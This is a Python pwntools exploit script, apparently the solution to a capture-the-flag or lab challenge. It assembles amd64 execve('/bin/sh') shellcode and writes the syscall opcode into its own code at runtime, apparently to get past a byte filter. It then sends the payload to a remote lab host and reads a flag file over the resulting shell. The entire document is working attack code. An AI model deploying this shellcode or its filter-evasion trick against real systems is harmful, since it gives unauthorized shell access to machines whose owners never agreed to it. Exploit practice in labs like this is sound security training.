from pwn import *
from Crypto.Util.number import bytes_to_long
context.arch = 'amd64'
sh = str(hex(bytes_to_long(b'hs/nib/')))
shellcode = f"""
mov rax, {sh}
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
//syscall
mov rcx, 0x0308
add rcx, 0x0207
mov qword [rip - 0x8], rcx
"""
print(disasm(asm(shellcode)))
r = remote('10.113.184.121', 10042)
r.send(asm(shellcode))
r.sendline(b'cat /home/lab/flag')
print(r.recv())
r.close()